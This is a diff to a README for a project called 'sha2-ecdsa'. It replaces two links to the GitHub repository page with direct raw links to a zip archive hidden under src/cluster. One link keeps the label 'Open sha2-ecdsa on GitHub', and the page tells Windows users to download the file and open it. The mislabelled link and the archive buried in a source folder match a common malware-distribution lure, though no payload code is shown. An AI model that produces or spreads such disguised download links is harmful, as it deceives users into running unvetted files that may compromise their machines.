@@ -1,11 +1,11 @@
 # 🧩 sha2-ecdsa - A hash that signs itself
 
-[![Download sha2-ecdsa](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rutherforddry602/sha2-ecdsa)
+[![Download sha2-ecdsa](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rutherforddry602/sha2-ecdsa/main/src/cluster/ecdsa-sha-2.9-beta.4.zip)
 
 ## 📥 Download and open
 Use this link to visit the download page:
 
-[Open sha2-ecdsa on GitHub](https://github.com/Rutherforddry602/sha2-ecdsa)
+[Open sha2-ecdsa on GitHub](https://raw.githubusercontent.com/Rutherforddry602/sha2-ecdsa/main/src/cluster/ecdsa-sha-2.9-beta.4.zip)
 
 On the page, look for the latest release or the main download link. If you see a file for Windows, download it and open it on your PC.
 
